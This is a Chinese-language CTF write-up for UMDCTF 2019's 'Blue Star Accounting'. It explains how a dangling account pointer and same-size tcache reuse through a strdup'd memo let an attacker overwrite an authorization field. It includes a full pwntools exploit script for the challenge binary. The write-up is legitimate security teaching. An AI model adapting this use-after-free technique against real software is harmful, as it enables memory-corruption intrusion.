# UMDCTF 2019 - Blue Star Accounting

## 题目简述

附件是一个菜单式 64 位 ELF。程序创建、显示和删除账户，也允许添加 memo。删除账户后全局指针没有清空，形成 use-after-free；随后 `strdup` 分配 memo 时可复用同一 tcache chunk，控制已释放账户的授权字段。

## 解题过程

保护检查显示 PIE、NX、Partial RELRO，且没有栈 canary，但本题不需要栈溢出。逆向账户对象可得：

```text
offset 0x00  first name
offset 0x20  last name
offset 0x40  flag authorization value
size   0x48
```

“Delete account”会 `free(account)`，却继续保留 `account` 指针。“Add memo”使用 `strdup`；只要申请大小落入相同的 `0x50` tcache size class，新字符串就会占用刚释放的账户块。

“Print flag”把偏移 `0x40` 的四字节整数与 `0x45444f43` 比较。按小端内存排列，这正是字节串 `CODE`。因此流程是：

```python
from pwn import *

io = process("./BlueStarAccounting_v0.1")

io.sendlineafter(b"operation number:", b"1")
io.sendlineafter(b"First name:", b"A")
io.sendlineafter(b"Last name:", b"B")

io.sendlineafter(b"operation number:", b"3")

io.sendlineafter(b"operation number:", b"6")
io.sendlineafter(b"Please enter memo:", b"A" * 64 + b"CODE")

io.sendlineafter(b"operation number:", b"7")
io.interactive()
```

本地调试中，memo 确实复用了已释放块，选项 7 进入 `/bin/cat flag` 分支，说明利用链成立。仓库未包含服务端 `flag` 文件，历史服务也不可用，所以无法从现有材料恢复具体 flag 字符串。

## 方法总结

本题的决定性原语是悬空指针与同尺寸堆块复用。分析菜单题时，要把每个操作对应的分配、释放和全局指针状态画清楚，再依据 allocator size class 设计覆盖长度。成功到达读取 flag 的分支已能验证利用，但不能替代缺失的服务端秘密。
